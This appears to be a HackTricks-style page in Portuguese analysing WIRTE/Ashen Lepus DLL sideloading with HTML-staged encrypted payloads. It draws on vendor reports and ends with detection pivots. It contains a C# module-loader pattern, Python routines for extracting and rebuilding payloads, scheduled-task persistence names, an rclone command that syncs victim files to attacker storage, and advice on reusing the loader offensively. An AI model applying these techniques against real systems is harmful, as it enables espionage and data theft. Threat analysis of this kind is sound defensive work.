# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral da Tradecraft

Ashen Lepus (aka WIRTE) weaponized um padrão repetível que encadeia DLL sideloading, staged HTML payloads, e modular .NET backdoors para persistir dentro de redes diplomáticas do Oriente Médio. A técnica é reutilizável por qualquer operator porque depende de:

- **Archive-based social engineering**: PDFs benignos instruem os alvos a baixar um arquivo RAR de um site de file-sharing. O archive inclui um EXE de visualização de documento com aparência real, uma DLL maliciosa nomeada após uma biblioteca confiável (por exemplo, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), e um `Document.pdf` isca.
- **DLL search order abuse**: a vítima dá duplo clique no EXE, o Windows resolve o import da DLL a partir do diretório atual, e o malicious loader (AshenLoader) executa dentro do processo confiável enquanto o PDF isca abre para evitar suspeita.
- **Living-off-the-land staging**: cada stage posterior (AshenStager → AshenOrchestrator → modules) é mantido fora do disk até ser necessário, entregue como blobs encriptados escondidos dentro de respostas HTML aparentemente inofensivas.

## Cadeia de Side-Loading em Múltiplos Estágios

1. **Decoy EXE → AshenLoader**: o EXE side-loads AshenLoader, que faz host recon, AES-CTR encripta isso, e faz POST disso dentro de parâmetros rotativos como `token=`, `id=`, `q=`, ou `auth=` para paths com aparência de API (por exemplo, `/api/v2/account`).
2. **HTML extraction**: o C2 só entrega o próximo stage quando o IP do client geolocaliza para a região alvo e o `User-Agent` corresponde ao implant, frustrando sandboxes. Quando as verificações passam, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload Base64/AES-CTR encriptado do AshenStager.
3. **Second sideload**: AshenStager é implantado com outro binary legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binary busca mais HTML, desta vez extraindo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: um controller modular .NET que decodifica uma config Base64 JSON. Os campos `tg` e `au` da config são concatenados/hasheados na AES key, que decripta `xrk`. Os bytes resultantes atuam como uma XOR key para cada module blob buscado depois.
5. **Module delivery**: cada module é descrito por meio de comentários HTML que redirecionam o parser para uma tag arbitrária, quebrando regras estáticas que olham apenas para `<headerp>` ou `<article>`. Os modules incluem persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), e file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de Evasão de Staging em HTML

Pesquisas recentes sobre HTML smuggling (Talos) destacam payloads escondidos como strings Base64 dentro de blocos `<script>` em anexos HTML e decodificados via JavaScript em tempo de execução. O mesmo truque pode ser reutilizado para respostas de C2: armazenar blobs criptografados dentro de uma tag script (ou outro elemento DOM) e decodificá-los na memória antes de AES/XOR, fazendo a página parecer HTML comum. Talos também mostra ofuscação em camadas (renomeação de identificadores + Base64/Caesar/AES) dentro de tags script, o que se encaixa perfeitamente em blobs de C2 staged em HTML. Um writeup posterior da Talos sobre **hidden text salting** também é relevante aqui: dividir Base64 com comentários HTML irrelevantes ou whitespace é suficiente para quebrar extratores regex simples, mantendo a reconstrução no lado do browser trivial.

## Notas de Variante Recentes (2024-2025)

- Check Point observou campanhas WIRTE em 2024 que ainda dependiam de sideloading baseado em archive, mas usavam `propsys.dll` (stagerx64) como a primeira stage. O stager decodifica o payload seguinte com Base64 + XOR (key `53`), envia requisições HTTP com um `User-Agent` hardcoded e extrai blobs criptografados embutidos entre tags HTML. Em um branch, a stage era reconstruída a partir de uma longa lista de strings IP embutidas decodificadas via `RtlIpv4StringToAddressA`, depois concatenadas nos bytes do payload.
- A OWN-CERT documentou tooling anterior da WIRTE em que o dropper side-loaded `wtsapi32.dll` protegia strings com Base64 + TEA e usava o próprio nome da DLL como key de decriptação, depois ofuscando com XOR/Base64 os dados de identificação do host antes de enviá-los ao C2.

## Reconstruindo Stages Codificadas em IP

O branch `propsys.dll` da WIRTE em 2024 mostra que o próximo PE não precisa existir como um único blob HTML contíguo. O loader pode armazenar bytes da stage como strings dotted-quad e reconstruí-los com `RtlIpv4StringToAddressA`, um padrão intimamente relacionado ao tradecraft de **IPfuscation** da Hive. Operacionalmente, isso é útil quando o ator quer que a página HTML contenha o que parece ser IOCs inofensivos ou dados de config em vez de um payload Base64 óbvio.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Se os bytes recuperados começarem com `MZ`, você provavelmente reconstruiu o próximo PE diretamente. Caso contrário, verifique uma camada inicial XOR/Base64 ou pequenos chunks delimitadores entre endereços.

## Nomes de DLL Substituíveis & Rotação de Host

Uma propriedade forte desse padrão é que o **backend de staging HTML/AES/XOR pode permanecer idêntico enquanto apenas o par de sideload muda**. A WIRTE rotacionou `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll` entre campanhas, o que é útil porque:

- `propsys.dll` e `wtsapi32.dll` são nomes de DLL do Windows sem graça que os defensores esperam existir em `%System32%` / `%SysWOW64%`.
- Catálogos públicos como **HijackLibs** já mapeiam muitos binários que carregarão esses nomes de DLL de um diretório de aplicação copiado, dando aos operadores hosts de substituição sem redesenhar o stager.
- Apenas a superfície de exportação precisa ser adaptada por host. O parser HTML, as rotinas AES/XOR e o carregador de módulo geralmente podem ser transplantados sem mudanças para uma DLL proxy de forwarding.

Para trabalho ofensivo em laboratório, isso significa que você pode separar o problema em **(1) encontrar um host assinado estável que resolva o nome de DLL escolhido localmente** e **(2) reutilizar a mesma lógica de loader HTML em stages atrás dessa DLL**.

## Fortalecimento de Crypto & C2

- **AES-CTR em todo lugar**: loaders atuais embutem chaves de 256 bits mais nonces (por exemplo, `{9a 20 51 98 ...}`) e opcionalmente adicionam uma camada XOR usando strings como `msasn1.dll` antes/depois da decriptação.
- **Variações de material de chave**: loaders anteriores usavam Base64 + TEA para proteger strings embutidas, com a chave de decriptação derivada do nome da DLL maliciosa (por exemplo, `wtsapi32.dll`).
- **Divisão de infraestrutura + camuflagem por subdomínio**: servidores de staging são separados por ferramenta, hospedados em ASNs variados e às vezes fronted por subdomínios com aparência legítima, então queimar um stage não expõe o restante.
- **Smuggling de reconnaissance**: os dados enumerados agora incluem listagens de Program Files para identificar apps de alto valor e sempre são criptografados antes de sair do host.
- **Rotação de URI**: parâmetros de query e paths REST alternam entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **Fixação de User-Agent + redirects seguros**: a infraestrutura de C2 responde apenas a strings exatas de UA e, caso contrário, redireciona para sites benignos de notícias/saúde para se misturar.
- **Entrega com gate**: servidores são geo-fenced e só respondem a implants reais. Clientes não aprovados recebem HTML nada suspeito.

## Persistência & Loop de Execução

AshenStager cria scheduled tasks que se passam por jobs de manutenção do Windows e são executados via `svchost.exe`, por exemplo:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tasks reiniciam a cadeia de sideloading no boot ou em intervalos, garantindo que AshenOrchestrator possa solicitar novos módulos sem tocar no disco novamente.

## Usando Clientes de Sync Benignos para Exfiltration

Os operadores colocam documentos diplomáticos em `C:\Users\Public` (legível por todos e nada suspeito) por meio de um módulo dedicado, depois baixam o binário legítimo do [Rclone](https://rclone.org/) para sincronizar esse diretório com o armazenamento do atacante. A Unit42 observa que esta é a primeira vez que esse ator foi observado usando Rclone para exfiltration, alinhando-se à tendência mais ampla de abusar de ferramentas legítimas de sincronização para se misturar ao tráfego normal:

1. **Stage**: copie/colecione os arquivos-alvo em `C:\Users\Public\{campaign}\`.
2. **Configure**: envie uma config do Rclone apontando para um endpoint HTTPS controlado pelo atacante (por exemplo, `api.technology-system[.]com`).
3. **Sync**: execute `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que o tráfego se pareça com backups normais em cloud.

Como o Rclone é amplamente usado em fluxos legítimos de backup, defensores devem focar em execuções anômalas (novos binários, remotes estranhos ou sincronização repentina de `C:\Users\Public`).

## Pivôs de Detecção

- Alerta para **processos assinados** que inesperadamente carregam DLLs de caminhos graváveis pelo usuário (filtros do Procmon + `Get-ProcessMitigation -Module`), especialmente quando os nomes das DLLs coincidem com `netutils`, `srvcli`, `dwampi`, `wtsapi32` ou `propsys`.
- Inspecione respostas HTTPS suspeitas em busca de **grandes blobs Base64 embutidos dentro de tags incomuns** ou protegidos por comentários `<!-- TAG: <xyz> -->`.
- Normalize o HTML primeiro: **remova comentários e colapse espaços em branco antes da extração Base64**, porque a evasão no estilo hidden-text-salting pode dividir payloads entre fronteiras de comentários.
- Amplie a caça em HTML para **strings Base64 dentro de blocos `<script>`** (staging no estilo HTML smuggling) que são decodificadas via JavaScript antes do processamento AES/XOR.
- Procure chamadas repetidas de **`RtlIpv4StringToAddressA` seguidas por montagem de buffer**, especialmente quando as strings ao redor são listas longas de IPv4 e não alvos reais de rede.
- Procure por **scheduled tasks** que executem `svchost.exe` com argumentos não relacionados a serviço ou que apontem de volta para diretórios de dropper.
- Monitore **redirects de C2** que só retornam payloads para strings exatas de `User-Agent` e, caso contrário, redirecionam para domínios legítimos de notícias/saúde.
- Monitore binários do **Rclone** aparecendo fora de locais gerenciados pela TI, novos arquivos `rclone.conf` ou jobs de sync puxando de diretórios de staging como `C:\Users\Public`.

## Referências

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
